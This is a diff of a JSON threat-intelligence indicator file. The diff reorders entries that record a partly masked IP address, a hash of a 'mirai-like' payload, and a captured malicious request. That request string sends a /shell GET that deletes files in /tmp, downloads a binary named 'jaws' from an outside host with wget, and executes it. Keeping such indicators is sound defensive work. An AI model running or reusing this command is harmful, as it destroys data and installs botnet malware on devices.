@@ -6,16 +6,16 @@
     "value": "140.233.190.XXX"
   },
   {
-    "context": "Inbound payload hash (mirai-like)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd"
-  },
-  {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.XXX/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1"
+  },
+  {
+    "context": "Inbound payload hash (mirai-like)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd"
   },
   {
     "asn": "MILANIN NET",
